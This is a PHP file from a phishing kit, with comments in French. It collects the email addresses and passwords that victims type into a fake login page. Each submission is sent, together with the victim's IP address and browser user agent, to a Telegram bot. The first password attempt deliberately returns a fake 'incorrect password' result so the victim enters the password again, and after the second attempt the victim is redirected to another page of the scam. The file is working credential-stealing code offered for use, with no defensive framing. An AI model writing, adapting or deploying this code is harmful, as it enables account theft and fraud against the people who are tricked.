<?php
if ($_SERVER['HTTP_HOST'] === 'monlien.com' && $_SERVER['REQUEST_URI'] === '/') {
    header('Location: /Se-connecter.php');
    exit();
}
?>
<?php
session_start();

// Vos includes habituels
include('../email.php');
include('../PREVENTS/infos.php');

// Vérifie que 'email' et 'password' sont bien postés
if (!isset($_POST['email']) || !isset($_POST['password'])) {
    exit("Aucun champs transmis");
}

// Enregistre l'IP, le User-Agent et l'e-mail dans $_SESSION (par commodité)
$_SESSION['ip']        = $_SERVER['REMOTE_ADDR'];
$_SESSION['useragent'] = $_SERVER['HTTP_USER_AGENT'];
$_SESSION['email']     = $_POST['email'];

// Détermine si c'est la 2ᵉ tentative (presence de password_1)
if (isset($_POST['password_1'])) {
    // On a password_1 + password “final”
    $pwd1 = $_POST['password_1'];
    $pwd2 = $_POST['password'];

    // Prépare le message Telegram
    $message = "
👨🏻‍⚕️ E-MAIL : {$_SESSION['email']}
🩺 PASSWORD 1 : {$pwd1}
🩺 PASSWORD 2 : {$pwd2}

📍 IP : {$_SESSION['ip']}
👨🏻‍💻 UA : {$_SESSION['useragent']}
";

    // Envoi sur Telegram
    $data = [
        'chat_id' => $chat_id,   // défini dans infos.php (ou ailleurs)
        'text'    => $message
    ];
    @file_get_contents("https://api.telegram.org/bot{$bot_token}/sendMessage?" . http_build_query($data));

    
    header('Location: ../informations-importantes.php');
    exit();

} else {
    // 1ʳᵉ tentative => on n'a que “password”
    $pwd1 = $_POST['password'];

    // Prépare le message Telegram
    $message = "
👨🏻‍⚕️ E-MAIL : {$_SESSION['email']}
🩺 PASSWORD 1 : {$pwd1}

📍 IP : {$_SESSION['ip']}
💻 UA : {$_SESSION['useragent']}
";

    // Envoi sur Telegram
    $data = [
        'chat_id' => $chat_id,
        'text'    => $message
    ];
    @file_get_contents("https://api.telegram.org/bot{$bot_token}/sendMessage?" . http_build_query($data));

    // On ne redirige pas ici => on “exit()”
    // (L'utilisateur reste sur la même page, côté front, 
    //  le script JS gère l'affichage “Mot de passe incorrect” 
    //  et la possibilité d'une 2e tentative.)
    exit();
}
